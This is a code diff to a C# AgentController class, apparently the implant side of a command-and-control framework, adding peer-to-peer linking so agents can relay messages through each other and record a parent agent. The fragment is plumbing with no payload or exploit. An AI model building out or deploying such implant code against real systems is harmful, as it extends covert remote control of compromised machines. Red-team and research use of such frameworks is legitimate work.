@@ -1,4 +1,6 @@
-﻿using System;
+﻿using Agent.Controllers;
+
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -9,8 +11,9 @@ class AgentController
 
     ConfigController Config;
     CryptoController Crypto;
-    ICommModule CommModule;
-
+    P2PController P2P;
+    
+    public ICommModule CommModule { get; private set; }
     public AgentMetadata AgentMetadata { get; private set; }
     public List<AgentModuleInfo> AgentModules { get; private set; } = new List<AgentModuleInfo>();
 
@@ -39,6 +42,8 @@ class AgentController
             Arch = Helpers.GetArch,
             CLR = Helpers.GetCLRVersion
         };
+
+        P2P = new P2PController(this);
     }
 
     public void RegisterAgentModule(IAgentModule module)
@@ -65,6 +70,7 @@ class AgentController
 
         CommModule.SetMetadata(AgentMetadata);
         CommModule.Start();
+        P2P.Start();
 
         while (AgentStatus == AgentStatus.Running)
         {
@@ -137,5 +143,20 @@ class AgentController
                 }
             }
         }
+        else // for a p2p agent
+        {
+            P2P.BroadcastMessage(message); // very lazy approach until i can figure out a solution
+        }
+    }
+
+    public void AddP2PAgent(string hostname, ICommModule module)
+    {
+        module.Init(Config, Crypto);
+        P2P.LinkAgent(hostname, module);
+    }
+
+    public void SetParentAgent(string agentID)
+    {
+        AgentMetadata.ParentAgentID = agentID;
     }
 }
